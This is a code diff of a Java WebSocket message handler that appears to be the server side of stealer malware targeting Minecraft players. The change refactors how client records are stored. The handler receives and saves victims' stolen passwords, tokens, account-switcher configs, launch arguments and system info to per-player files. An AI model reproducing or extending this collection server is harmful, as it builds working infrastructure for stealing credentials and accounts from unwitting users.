@@ -1,7 +1,7 @@
 package me.soda.server.handlers;
 
 import com.google.gson.Gson;
-import me.soda.server.Client;
+import com.google.gson.JsonObject;
 import me.soda.server.Server;
 import org.java_websocket.WebSocket;
 
@@ -35,7 +35,7 @@ public class MessageHandler {
                     out.close();
                 }
                 case "skin" -> {
-                    String playerName = Server.clientMap.get(conn).playerName;
+                    String playerName =  Server.clientMap.get(conn).get("playerName").getAsString();
                     File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                     new File("skins").mkdir();
                     file.createNewFile();
@@ -56,12 +56,12 @@ public class MessageHandler {
                 }
                 case "player" -> {
                     String playerInfo = decodeBase64(msgArr[1]);
-                    Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, Client.class));
+                    Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, JsonObject.class));
                     log("Message: " + msgArr[0] + " " + playerInfo);
                 }
                 case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                     String ext = msgArr[0].equals("systeminfo") ? "txt" : "json";
-                    File file = new File("data", getFileName(msgArr[0], "json", Server.clientMap.get(conn).playerName, true));
+                    File file = new File("data", getFileName(msgArr[0], ext, Server.clientMap.get(conn).get("playerName").getAsString(), true));
                     new File("data").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
